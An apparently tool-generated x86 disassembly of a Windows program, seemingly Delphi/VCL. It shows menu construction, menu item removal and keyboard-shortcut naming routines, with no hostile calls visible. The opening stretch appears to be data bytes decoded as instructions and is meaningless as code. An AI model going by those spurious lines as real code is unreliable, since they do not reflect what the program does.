add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
jb r-xdata
push [ esi + edx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
xchg esp eax
mov [ r--data ] eax
add bh bh
cmp al 0x12
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4465646f
enter 0x44 0x68
add [ eax ] al
[ eax ]
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
je r-xdata
inc ebx
push 0x65676e61
mov [ 0x700041 ] dl
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
insd
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
enter 0x44 0x69
add [ eax ] al
[ ecx ]
inc ecx
add [ eax ] dl
sbb [ ebp ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
push esp
inc edx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
je r-xdata
sar al 0xcb
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 ] cl
inc esp
add [ eax + eax ] dl
add [ eax ] al
or al 0x1b
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ebx + ebx ] cl
outsb
sbb [ esi + 0x500044 ] bh
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
test ebx ebx
je r-xdata
je r-xdata
pushad
push ebp
inc edx
add ah al
push ebp
inc edx
add [ ebp + edx * 2 + 0x55900042 ] ah
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x44cc6490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x34 ] dh
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44154c
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44ccb0
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43bcfc
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44154c
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44cd08
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_44cd40
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403ef8
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404168
sub_44cd94
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44cf7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f90
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_4040e0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f90
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f90
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_4040e0
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_4040e0
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403ef8
mov eax esi
call sub_403ef8
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f90
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407e94
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404204
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_44cd40
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041c0
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f90
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041c0
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4041c0
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cf84
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f1c
retn
sub_44cf98
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4041b8
push eax
mov eax edi
call sub_4041b8
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4041b8
push eax
mov eax edi
call sub_4043b8
push eax
mov eax [ esi ]
call sub_4043b8
pop edx
pop ecx
call sub_407d74
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4041b8
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404458
sub_44cff4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_44d0cf
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44cf98
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44cf98
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44cf98
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44cf98
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d0d6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44cd94
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407d24
test eax eax
jne r-xdata
sub_44d10c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_44f6ac
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_44f6bc
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44d16c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_44f6ac
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44f6ac
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44f6bc
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44f6bc
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44d10c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_44d10c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44f6bc
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44f6bc
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44d2b8
push ebx
mov ebx eax
mov eax ebx
call sub_4499a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_4521c8
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44d2f0
push ebx
mov ebx eax
mov eax ebx
call sub_4499bc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d320
push ebx
mov ebx eax
mov eax ebx
call sub_4499d0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d350
push ebx
mov ebx eax
mov eax ebx
call sub_4499f8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d380
push ebx
mov ebx eax
mov eax ebx
call sub_449a20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404304
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d3b4
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4499e4
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d3f0
push ebx
mov ebx eax
mov eax ebx
call sub_449a34
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d424
push ebx
mov ebx eax
mov eax ebx
call sub_449a48
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d458
push ebx
mov ebx eax
mov eax ebx
call sub_449a5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d48c
push ebx
mov ebx eax
mov eax ebx
call sub_41b36c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d4b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44d4d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44f514
sub_44d4f4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44f584
sub_44d514
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44f5d8
sub_44d534
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_44d550
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403f4c
sub_44d574
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44f704
sub_44d594
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44f6e0
sub_44d5b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44f6f4
sub_44d5d4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44d600
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41aa7c
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44d0ec
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_450010
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_44d67c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_451fac
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_44f6ac
test eax eax
jg r-xdata
mov edx esi
call sub_44fa44
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_44f6bc
call sub_403124
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403124
lea eax [ esi + 0x44 ]
call sub_40d1c0
lea eax [ esi + 0x78 ]
call sub_40d1c0
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_44da98
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_414634
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aac8
test bl bl
jle r-xdata
call sub_403124
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_44d730
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d98b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d992
lea eax [ ebp - 0x40 ]
call sub_403ef8
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403f90
mov eax ebx
call sub_44f6ac
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_44dc40
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404304
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_44f6ac
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_44fc68
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44cd94
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404278
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043b8
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4043b8
push eax
mov eax ebx
call sub_44dc40
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_44f284
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404304
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4043b8
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_44f6ac
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_44dc40
mov [ ebp - 0x25 ] eax
sub_44d9ab
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_44d730
xor eax eax
pop ebp
retn
sub_44d9d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4512a4
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45026c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_450768
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44d16c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_44da40
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44da8a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_419620
mov eax [ ebp - 0x4 ]
call sub_44cff4
mov edx eax
mov eax ebx
call sub_44f6e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44da91
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_44da98
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_44db10
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41ab4c
sub_44dad4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41aecc
mov eax ebx
call sub_44f694
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_44f694
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403320
pop esi
pop ebx
retn
mov eax ebx
call sub_44db10
sub_44db10
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_44dc40
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_44db10
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_44dc40
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_44dc40
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44d9d0
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax ebp
call sub_44dc40
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
